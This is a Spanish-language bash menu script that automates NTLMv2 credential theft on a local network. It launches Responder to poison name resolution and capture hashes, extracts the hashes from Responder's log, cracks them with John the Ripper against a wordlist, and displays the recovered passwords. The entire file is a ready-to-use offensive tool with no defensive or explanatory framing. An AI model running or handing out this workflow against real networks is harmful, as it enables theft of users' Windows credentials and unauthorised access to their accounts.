#!/bin/bash


opcion="ninguna"


function opcion1
{

echo""
echo "	Ingrese la interface de red - Ejemplo: eth0"
echo ""
read interface

#Capture the NTLMv2
responder -I $interface -rdw

   read
   return 0

}

function opcion2
{

#Generar los hashes
cd /usr/share/responder/logs/
rm NTLM_Hashes.txt
cat /usr/share/responder/logs/Responder-Session.log | grep "NTLMv2-SSP Hash     :" | cut -d ":" -f 4-20 | awk '{$1=$1};1' >> NTLM_Hashes.txt
#cat Responder-Session.log | grep "NTLMv2-SSP Hash     :" | cut -d ":" -f 4-20 | awk '{$1=$1};1' >> NTLM_Hashes.txt

echo ""
echo "Se creo el archivo NTLM_Hashes.txt en /usr/share/responder/logs/Responder-Session.log/NTLM_Hashes.txt"
echo ""

   read
   return 0

}

function opcion3
{

echo ""
echo "Ingrese la ruta del diccionario - Ejemplo: /usr/share/wordlists/rockyou.txt"
echo ""
read dicc

echo ""
#Crackea los hashes
john --wordlist=$dicc /usr/share/responder/logs/NTLM_Hashes.txt

   read
   return 0

}

function opcion4
{

echo ""
#Contraseñas crackeadas
john /usr/share/responder/logs/NTLM_Hashes.txt --show | cut -d ":" -f 1-2
#john $dicc2 --show

   read
   return 0

}

while [ $opcion != "5"  ]
    do

echo "                                                                                                     "
echo "                                                                                                     "
echo "                                  [Created By Anonimo501]                                            "
echo "                            [https://youtube.com/c/Anonimo501]                                       "
echo "                                                                                                     "
echo -e "                              \e[33m  CAPTURE THE NTLMv2 - CRACK \e[0m	                                   "
echo "                                        	                                                           "



	echo -e "\e[31m \nMenu \e[0m"
	echo -e "\t1) Capture The NTLMv2"
	echo -e "\t2) Generar los hashes"
	echo -e "\t3) Crackea los hashes"
	echo -e "\t4) Ver Contraseñas crackeadas"
	echo -e "\t5) Salir\n"
	echo -e "\e[31m \tOpcion: \e[0m \c"

	read opcion

        if [ -z $opcion ] ; then opcion="ninguna" ; fi

        case $opcion in
		"1" )
                      opcion1
  		      ;;
		"2" )
		      opcion2
		      ;;
		"3" )
		      opcion3
		      ;;
                "4" )
                      opcion4
                      ;;
		"*" )
		      ;;

	esac


	/usr/bin/clear
done
